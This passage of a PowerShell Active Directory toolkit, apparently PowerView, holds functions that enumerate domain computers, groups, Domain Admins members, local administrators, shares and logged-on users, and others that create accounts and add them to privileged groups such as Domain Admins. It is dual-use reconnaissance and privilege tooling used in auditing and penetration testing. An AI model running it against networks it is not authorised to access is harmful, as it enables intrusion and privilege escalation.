        $usr = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $context

        # set user properties
        $usr.name = $UserName
        $usr.SamAccountName = $UserName
        $usr.PasswordNotRequired = $false
        $usr.SetPassword($password)
        $usr.Enabled = $true

        try{
            # commit the user
            $usr.Save()
            "[*] User $UserName successfully created in domain $Domain"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else{
        $objOu = [ADSI]"WinNT://$HostName"
        $objUser = $objOU.Create('User', $UserName)
        $objUser.SetPassword($Password)

        # commit the changes to the local machine
        try{
            $b = $objUser.SetInfo()
            "[*] User $UserName successfully created on host $HostName"
        }
        catch{
            # TODO: error handling if permissions incorrect
            Write-Warning '[!] Account already exists!'
            return
        }
    }

    # if a group is specified, invoke Invoke-NetGroupUserAdd and return its value
    if ($GroupName){
        # if we're adding the user to a domain
        if ($Domain){
            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -Domain $Domain
            "[*] User $UserName successfully added to group $GroupName in domain $Domain"
        }
        # otherwise, we're adding to a local group
        else{
            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -HostName $HostName
            "[*] User $UserName successfully added to group $GroupName on host $HostName"
        }
    }

}


function Get-NetComputers {
    <#
        .SYNOPSIS
        Gets an array of all current computers objects in a domain.

        .DESCRIPTION
        This function utilizes adsisearcher to query the current AD context
        for current computer objects. Based off of Carlos Perez's Audit.psm1
        script in Posh-SecMod (link below).

        .PARAMETER HostName
        Return computers with a specific name, wildcards accepted.

        .PARAMETER SPN
        Return computers with a specific service principal name, wildcards accepted.

        .PARAMETER OperatingSystem
        Return computers with a specific operating system, wildcards accepted.

        .PARAMETER ServicePack
        Return computers with a specific service pack, wildcards accepted.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER FullData
        Return full user computer objects instead of just system names (the default).

        .PARAMETER Domain
        The domain to query for computers.

        .OUTPUTS
        System.Array. An array of found system objects.

        .EXAMPLE
        > Get-NetComputers
        Returns the current computers in current domain.

        .EXAMPLE
        > Get-NetComputers -SPN mssql*
        Returns all MS SQL servers on the domain.

        .EXAMPLE
        > Get-NetComputers -Domain testing
        Returns the current computers in 'testing' domain.

        > Get-NetComputers -Domain testing -FullData
        Returns full computer objects in the 'testing' domain.

        .LINK
        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
    #>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = '*',

        [string]
        $SPN = '*',

        [string]
        $OperatingSystem = '*',

        [string]
        $ServicePack = '*',

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [string]
        $Domain
    )

    process {
        # if a domain is specified, try to grab that domain
        if ($Domain){

            # try to grab the primary DC for the current domain
            try{
                $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
            }
            catch{
                $PrimaryDC = $Null
            }

            try {
                # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
                $dn = "DC=$($Domain.Replace('.', ',DC='))"

                # if we could grab the primary DC for the current domain, use that for the query
                if($PrimaryDC){
                    $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
                }
                else{
                    # otherwise try to connect to the DC for the target domain
                    $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
                }

                # create the searcher object with our specific filters
                if ($ServicePack -ne '*'){
                    $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack)(servicePrincipalName=$SPN))"
                }
                else{
                    # server 2012 peculiarity- remove any mention to service pack
                    $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(servicePrincipalName=$SPN))"
                }

            }
            catch{
                Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            }
        }
        else{
            # otherwise, use the current domain
            if ($ServicePack -ne '*'){
                $CompSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack)(servicePrincipalName=$SPN))"
            }
            else{
                # server 2012 peculiarity- remove any mention to service pack
                $CompSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(servicePrincipalName=$SPN))"
            }
        }

        if ($CompSearcher){

            # eliminate that pesky 1000 system limit
            $CompSearcher.PageSize = 200

            $CompSearcher.FindAll() | ? {$_} | ForEach-Object {
                $up = $true
                if($Ping){
                    $up = Test-Server -Server $_.properties.dnshostname
                }
                if($up){
                    # return full data objects
                    if ($FullData){
                        $properties = $_.Properties
                        $out = New-Object psobject

                        $properties.PropertyNames | % {
                            if ($_ -eq "objectsid"){
                                # convert the SID to a string
                                $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                            }
                            elseif($_ -eq "objectguid"){
                                # convert the GUID to a string
                                $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                            }
                            elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ){
                                $out | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($properties[$_][0])))
                            }
                            else {
                                $out | Add-Member Noteproperty $_ $properties[$_][0]
                            }
                        }
                        $out
                    }
                    else{
                        # otherwise we're just returning the DNS host name
                        $_.properties.dnshostname
                    }
                }
            }
        }

    }
}


function Get-NetOUs {
    <#
        .SYNOPSIS
        Gets a list of all current OUs in a domain.

        .PARAMETER GroupName
        The group name to query for, wildcards accepted.

        .PARAMETER Domain
        The domain to query for OUs.

        .PARAMETER FullData
        Return full OU objects instead of just object names (the default).

        .EXAMPLE
        > Get-NetOUs
        Returns the current OUs in the domain.

        .EXAMPLE
        > Get-NetOUs -OUName *admin*
        Returns all OUs with "admin" in their name in
        the "testing" domain.
    #>

    [CmdletBinding()]
    Param (
        [string]
        $OUName = '*',

        [Switch]
        $FullData,

        [string]
        $Domain
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $OUSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $OUSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }

            $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName))"

        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $OUSearcher = [adsisearcher]"(&(objectCategory=organizationalUnit)(name=$OUName))"
    }

    if ($OUSearcher){

        # eliminate that pesky 1000 system limit
        $OUSearcher.PageSize = 200

        $OUSearcher.FindAll() | ForEach-Object {
            # if we're returning full data objects
            if ($FullData){
                $properties = $_.Properties
                $out = New-Object psobject

                $properties.PropertyNames | % {
                    if($_ -eq "objectguid"){
                        # convert the GUID to a string
                        $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                    }
                    else {
                        $out | Add-Member Noteproperty $_ $properties[$_][0]
                    }
                }
                $out
            }

            else{
                # otherwise we're just returning the ADS path
                $_.properties.adspath
            }
        }
    }
}


function Get-NetGUIDOUs {
    <#
        .SYNOPSIS
        Takes a GUID and returns the domain OUs linked to a specific GUID.

        .PARAMETER GUID
        The GUID to search for.

        .PARAMETER Domain
        The domain to query for groups.

        .PARAMETER FullData
        Return full OU objects instead of just object names (the default).

        .EXAMPLE
        > Get-NetGUIDOUs -GUID X
        Returns full OU objects names where the specific GUID applies.

        .EXAMPLE
        > Get-NetGUIDOUs -GUID X -FullData
        Returns full OU objects where the specific GUID applies.
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $GUID,

        [string]
        $Domain,

        [switch]
        $FullData
    )

    # grab the OUs for this domain
    $OUs = Get-NetOUs -FullData -Domain $Domain

    $OUs | ForEach-Object {
        # grab all the GP links for this object and check for the target GUID
        $a = $_.properties.gplink
        $_ | %{
            if($_.properties.gplink -match $GUID){
                if ($FullData){
                    $properties = $_.Properties
                    $out = New-Object psobject

                    $properties.PropertyNames | % {
                        if($_ -eq "objectguid"){
                            # convert the GUID to a string
                            $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                        }
                        else {
                            $out | Add-Member Noteproperty $_ $properties[$_][0]
                        }
                    }
                    $out
                }

                else{
                    $_.properties.distinguishedname
                }
            }
        }
    }
}


function Get-NetGroups {
    <#
        .SYNOPSIS
        Gets a list of all current groups in a domain.

        .PARAMETER GroupName
        The group name to query for, wildcards accepted.

        .PARAMETER Domain
        The domain to query for groups.

        .PARAMETER FullData
        Return full group objects instead of just object names (the default).

        .EXAMPLE
        > Get-NetGroups
        Returns the current groups in the domain.

        .EXAMPLE
        > Get-NetGroups -GroupName *admin*
        Returns all groups with "admin" in their group name.

        .EXAMPLE
        > Get-NetGroups -Domain testing -FullData
        Returns full group data objects in the 'testing' domain
    #>

    [CmdletBinding()]
    param(
        [string]
        $GroupName = '*',

        [string]
        $Domain,

        [switch]
        $FullData
    )

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $GroupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $GroupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }

            $GroupSearcher.filter = "(&(objectClass=group)(name=$GroupName))"
            # eliminate that pesky 1000 system limit
            $GroupSearcher.PageSize = 200

            $GroupSearcher.FindAll() | ForEach-Object {
                # if we're returning full data objects
                if ($FullData){
                    $properties = $_.Properties
                    $out = New-Object psobject

                    $properties.PropertyNames | % {
                        if ($_ -eq "objectsid"){
                            # convert the SID to a string
                            $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                        }
                        elseif($_ -eq "objectguid"){
                            # convert the GUID to a string
                            $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                        }
                        else {
                            if ($properties[$_].count -eq 1) {
                                $out | Add-Member Noteproperty $_ $properties[$_][0]
                            }
                            else {
                                $out | Add-Member Noteproperty $_ $properties[$_]
                            }
                        }
                    }
                    $out
                }
                else{
                    # otherwise we're just returning the group name
                    $_.properties.samaccountname
                }
            }
        }
        catch{
            Write-Warning "[!] The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        # otherwise, use the current domain
        $GroupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
        $GroupSearcher.PageSize = 200

        try {
            $GroupSearcher.FindAll() | ForEach-Object {
                # if we're returning full data objects
                if ($FullData){
                    $properties = $_.Properties
                    $out = New-Object psobject

                    $properties.PropertyNames | % {
                        if ($_ -eq "objectsid"){
                            # convert the SID to a string
                            $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                        }
                        elseif($_ -eq "objectguid"){
                            # convert the GUID to a string
                            $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                        }
                        else {
                            if ($properties[$_].count -eq 1) {
                                $out | Add-Member Noteproperty $_ $properties[$_][0]
                            }
                            else {
                                $out | Add-Member Noteproperty $_ $properties[$_]
                            }
                        }
                    }
                    $out
                }
                else{
                    # otherwise we're just returning the group name
                    $_.properties.samaccountname
                }
            }
        }
        catch{
            Write-Warning '[!] Can not contact domain.'
        }
    }
}


function Get-NetGroup {
    <#
        .SYNOPSIS
        Gets a list of all current users in a specified domain group.

        .DESCRIPTION
        This function users [ADSI] and LDAP to query the current AD context
        or trusted domain for users in a specified group. If no GroupName is
        specified, it defaults to querying the "Domain Admins" group.
        This is a replacement for "net group 'name' /domain"

        .PARAMETER GroupName
        The group name to query for users. If not given, it defaults to "Domain Admins"

        .PARAMETER Domain
        The domain to query for group users.

        .PARAMETER FullData
        Switch. Returns full data objects instead of just group/users.

        .PARAMETER Recurse
        Switch. If the group member is a group, recursively try to query its members as well.

        .EXAMPLE
        > Get-NetGroup
        Returns the usernames that of members of the "Domain Admins" domain group.

        .EXAMPLE
        > Get-NetGroup -Domain testing -GroupName "Power Users"
        Returns the usernames that of members of the "Power Users" group
        in the 'testing' domain.

        .LINK
        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$true)]
        [string]
        $GroupName = 'Domain Admins',

        [Switch]
        $FullData,

        [Switch]
        $Recurse,

        [string]
        $Domain,

        [string]
        $PrimaryDC
    )

    process {

        # if a domain is specified, try to grab that domain
        if ($Domain){

            # try to grab the primary DC for the current domain
            try{
                $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
            }
            catch{
                $PrimaryDC = $Null
            }

            try {
                # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx

                $dn = "DC=$($Domain.Replace('.', ',DC='))"

                # if we could grab the primary DC for the current domain, use that for the query
                if($PrimaryDC){
                    $GroupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
                }
                else{
                    # otherwise try to connect to the DC for the target domain
                    $GroupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
                }
                # samAccountType=805306368 indicates user objects
                $GroupSearcher.filter = "(&(objectClass=group)(name=$GroupName))"
            }
            catch{
                Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            }
        }
        else{
            $Domain = (Get-NetDomain).Name

            # otherwise, use the current domain
            $GroupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
        }

        if ($GroupSearcher){
            $GroupSearcher.PageSize = 200
            $GroupSearcher.FindAll() | % {
                try{
                    $GroupFoundName = $_.properties.name[0]
                    $_.properties.member | ForEach-Object {
                        # for each user/member, do a quick adsi object grab
                        if ($PrimaryDC){
                            $properties = ([adsi]"LDAP://$PrimaryDC/$_").Properties
                        }
                        else {
                            $properties = ([adsi]"LDAP://$_").Properties
                        }

                        # check if the result is a user account- if not assume it's a group
                        if ($properties.samAccountType -ne "805306368"){
                            $isGroup = $True
                        }
                        else{
                            $isGroup = $False
                        }

                        $out = New-Object psobject
                        $out | add-member Noteproperty 'GroupDomain' $Domain
                        $out | Add-Member Noteproperty 'GroupName' $GroupFoundName

                        if ($FullData){
                            $properties.PropertyNames | % {
                                # TODO: errors on cross-domain users?
                                if ($_ -eq "objectsid"){
                                    # convert the SID to a string
                                    $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                                }
                                elseif($_ -eq "objectguid"){
                                    # convert the GUID to a string
                                    $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                                }
                                else {
                                    if ($properties[$_].count -eq 1) {
                                        $out | Add-Member Noteproperty $_ $properties[$_][0]
                                    }
                                    else {
                                        $out | Add-Member Noteproperty $_ $properties[$_]
                                    }
                                }
                                $out
                            }
                        }
                        else {
                            $MemberDN = $properties.distinguishedName[0]
                            # extract the FQDN from the Distinguished Name
                            $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                            if ($properties.samAccountType -ne "805306368"){
                                $isGroup = $True
                            }
                            else{
                                $isGroup = $False
                            }

                            if ($properties.samAccountName){
                                # forest users have the samAccountName set
                                $MemberName = $properties.samAccountName[0]
                            }
                            else {
                                # external trust users have a SID, so convert it
                                try {
                                    $MemberName = Convert-SidToName $properties.cn[0]
                                }
                                catch {
                                    # if there's a problem contacting the domain to resolve the SID
                                    $MemberName = $properties.cn
                                }
                            }
                            $out | add-member Noteproperty 'MemberDomain' $MemberDomain
                            $out | add-member Noteproperty 'MemberName' $MemberName
                            $out | add-member Noteproperty 'IsGroup' $IsGroup
                            $out | add-member Noteproperty 'MemberDN' $MemberDN
                        }

                        $out

                        if($Recurse) {
                            # if we're recursiving and  the returned value isn't a user account, assume it's a group
                            if($IsGroup){
                                if($FullData){
                                    Get-NetGroup -Domain $Domain -PrimaryDC $PrimaryDC -FullData -Recurse -GroupName $properties.SamAccountName[0]
                                }
                                else {
                                    Get-NetGroup -Domain $Domain -PrimaryDC $PrimaryDC -Recurse -GroupName $properties.SamAccountName[0]
                                }
                            }
                        }
                    }
                }
                catch {
                    write-verbose $_
                }
            }
        }
    }
}


function Get-NetLocalGroups {
    <#
        .SYNOPSIS
        Gets a list of all localgroups on a remote machine.

        .PARAMETER HostName
        The hostname or IP to query for local group users.

        .PARAMETER HostList
        List of hostnames/IPs to query for local group users.

        .EXAMPLE
        > Get-NetLocalGroups
        Returns all local groups, equivalent to "net localgroup"

        .EXAMPLE
        > Get-NetLocalGroups -HostName WINDOWSXP
        Returns all the local groups on WINDOWSXP

        .LINK
        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost',

        [string]
        $HostList
    )

    process {
        $Servers = @()

        # if we have a host list passed, grab it
        if($HostList){
            if (Test-Path -Path $HostList){
                $Servers = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                $null
            }
        }
        else{
            # otherwise assume a single host name
            $Servers += Get-NameField $HostName
        }

        foreach($Server in $Servers)
        {
            try{
                $computer = [ADSI]"WinNT://$server,computer"

                $computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'Server' $Server
                    $out | Add-Member Noteproperty 'Group' (($_.name)[0])
                    $out | Add-Member Noteproperty 'SID' ((new-object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                    $out
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Get-NetLocalGroup {
    <#
        .SYNOPSIS
        Gets a list of all current users in a specified local group.

        .PARAMETER HostName
        The hostname or IP to query for local group users.

        .PARAMETER HostList
        List of hostnames/IPs to query for local group users.

        .PARAMETER GroupName
        The local group name to query for users. If not given, it defaults to "Administrators"

        .EXAMPLE
        > Get-NetLocalGroup
        Returns the usernames that of members of localgroup "Administrators" on the local host.

        .EXAMPLE
        > Get-NetLocalGroup -HostName WINDOWSXP
        Returns all the local administrator accounts for WINDOWSXP

        .LINK
        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
        http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost',

        [string]
        $HostList,

        [string]
        $GroupName
    )

    process {

        $Servers = @()

        # if we have a host list passed, grab it
        if($HostList){
            if (Test-Path -Path $HostList){
                $Servers = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                $null
            }
        }
        else{
            # otherwise assume a single host name
            $Servers += Get-NameField $HostName
        }

        if (-not $GroupName){
            # resolve the SID for the local admin group - this should usually default to "Administrators"
            $objSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
            $objgroup = $objSID.Translate( [System.Security.Principal.NTAccount])
            $GroupName = ($objgroup.Value).Split('\')[1]
        }

        # query the specified group using the WINNT provider, and
        # extract fields as appropriate from the results
        foreach($Server in $Servers)
        {
            try{
                $members = @($([ADSI]"WinNT://$server/$groupname").psbase.Invoke('Members'))
                $members | ForEach-Object {
                    write-verbose $_
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'Server' $Server
                    $out | Add-Member Noteproperty 'AccountName' ( $_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '')
                    # # translate the binary sid to a string
                    $out | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $null, $_, $null),0)).Value)
                    # # if the account is local, check if it's disabled, if it's domain, always print $false
                    $out | Add-Member Noteproperty 'Disabled' $(if((($_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '')-like "*/$server/*")) {try{$_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $null, $_, $null)} catch {'ERROR'} } else {$False} )
                    # # check if the member is a group
                    $IsGroup = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                    $out | Add-Member Noteproperty 'IsGroup' $IsGroup
                    if($IsGroup){
                        $out | Add-Member Noteproperty 'LastLogin' ""
                    }
                    else{
                        try {
                            $out | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $null, $_, $null))
                        }
                        catch {
                            $out | Add-Member Noteproperty 'LastLogin' ""
                        }
                    }
                    $out
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Get-NetLocalServices {
    <#
        .SYNOPSIS
        Gets a list of all local services running on a remote machine.

        .PARAMETER HostName
        The hostname or IP to query for local group users.

        .PARAMETER HostList
        List of hostnames/IPs to query for local group users.

        .EXAMPLE
        > Get-NetLocalServices -HostName WINDOWSXP
        Returns all the local services running on WINDOWSXP
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost',

        [string]
        $HostList
    )

    process {
        $Servers = @()

        # if we have a host list passed, grab it
        if($HostList){
            if (Test-Path -Path $HostList){
                $Servers = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                $null
            }
        }
        else{
            # otherwise assume a single host name
            $Servers += Get-NameField $HostName
        }

        foreach($Server in $Servers)
        {
            $computer = [ADSI]"WinNT://$server,computer"

            $computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'service' } | ForEach-Object {
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'Server' $Server
                $out | Add-Member Noteproperty 'ServiceName' $_.name[0]
                $out | Add-Member Noteproperty 'ServicePath' $_.Path[0]
                $out | Add-Member Noteproperty 'ServiceAccountName' $_.ServiceAccountName[0]
                $out
            }
        }
    }
}


function Invoke-NetGroupUserAdd {
    <#
        .SYNOPSIS
        Adds a local or domain user to a local or domain group.

        .PARAMETER UserName
        The domain username to query for.

        .PARAMETER GroupName
        Group to add the user to.

        .PARAMETER Domain
        Domain to add the user to.

        .PARAMETER HostName
        Hostname to add the user to, defaults to localhost.

        .EXAMPLE
        > Invoke-NetGroupUserAdd -UserName john -GroupName Administrators
        Adds a localuser "john" to the local group "Administrators"

        .EXAMPLE
        > Invoke-NetGroupUserAdd -UserName john -GroupName "Domain Admins" -Domain dev.local
        Adds the existing user "john" to the domain group "Domain Admins" in
        "dev.local"
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $UserName,

        [Parameter(Mandatory = $True)]
        [string]
        $GroupName,

        [string]
        $Domain,

        [string]
        $HostName = 'localhost'
    )

    # add the assembly if we need it
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # if we're adding to a remote host, use the WinNT provider
    if($HostName -ne 'localhost'){
        try{
            ([ADSI]"WinNT://$HostName/$GroupName,group").add("WinNT://$HostName/$UserName,user")
            "[*] User $UserName successfully added to group $GroupName on $HostName"
        }
        catch{
            Write-Warning "[!] Error adding user $UserName to group $GroupName on $HostName"
            return
        }
    }

    # otherwise it's a local or domain add
    else{
        if ($Domain){
            $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
            $d = Get-NetDomain -Domain $Domain
            if(-not $d){
                return $Null
            }
        }
        else{
            # otherwise, get the local machine context
            $ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
        }

        # get the full principal context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d

        # find the particular group
        $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context,$GroupName)

        # add the particular user to the group
        $group.Members.add($context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

        # commit the changes
        $group.Save()
    }
}


function Get-NetFileServers {
    <#
        .SYNOPSIS
        Returns a list of all file servers extracted from user 
        homedirectory, scriptpath, and profilepath fields.

        .PARAMETER Domain
        The domain to query for user file servers.

        .EXAMPLE
        > Get-NetFileServers
        Returns active file servers.

        .EXAMPLE
        > Get-NetFileServers -Domain testing
        Returns active file servers for the 'testing' domain.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain
    )

    $Servers = @()

    Get-NetUser -Domain $Domain | % {
        if($_.homedirectory){
            $temp = $_.homedirectory.split("\\")[2]
            if($temp -and ($temp -ne '')){
                $Servers += $temp
            }
        }
        if($_.scriptpath){
            $temp = $_.scriptpath.split("\\")[2]
            if($temp -and ($temp -ne '')){
                $Servers += $temp
            }
        }
        if($_.profilepath){
            $temp = $_.profilepath.split("\\")[2]
            if($temp -and ($temp -ne '')){
                $Servers += $temp
            }
        }
    }

    # uniquify the fileserver list and return it
    $($Servers | Sort-Object -Unique)
}


function Get-NetShare {
    <#
        .SYNOPSIS
        Gets share information for a specified server.

        .DESCRIPTION
        This function will execute the NetShareEnum Win32API call to query
        a given host for open shares. This is a replacement for
        "net share \\hostname"

        .PARAMETER HostName
        The hostname to query for shares.

        .OUTPUTS
        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
        result structure which includes the name and note for each share.

        .EXAMPLE
        > Get-NetShare
        Returns active shares on the local host.

        .EXAMPLE
        > Get-NetShare -HostName sqlserver
        Returns active shares on the 'sqlserver' host
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # arguments for NetShareEnum
        $QueryLevel = 1
        $ptrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get the share information
        $Result = $Netapi32::NetShareEnum($HostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        Write-Debug "Get-NetShare result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $SHARE_INFO_1::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++){
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $newintptr = New-Object system.Intptr -ArgumentList $offset
                $Info = $newintptr -as $SHARE_INFO_1
                # return all the sections of the structure
                $Info | Select-Object *
                $offset = $newintptr.ToInt64()
                $offset += $increment
            }
            # free up the result buffer
            $Netapi32::NetApiBufferFree($ptrInfo) | Out-Null
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetLoggedon {
    <#
        .SYNOPSIS
        Gets users actively logged onto a specified server.

        .DESCRIPTION
        This function will execute the NetWkstaUserEnum Win32API call to query
        a given host for actively logged on users.

        .PARAMETER HostName
        The hostname to query for logged on users.

        .OUTPUTS
        WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1
        result structure which includes the username and domain of logged on users.

        .EXAMPLE
        > Get-NetLoggedon
        Returns users actively logged onto the local host.

        .EXAMPLE
        > Get-NetLoggedon -HostName sqlserver
        Returns users actively logged onto the 'sqlserver' host.

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # Declare the reference variables
        $QueryLevel = 1
        $ptrInfo = [IntPtr]::Zero
        $EntriesRead = 0
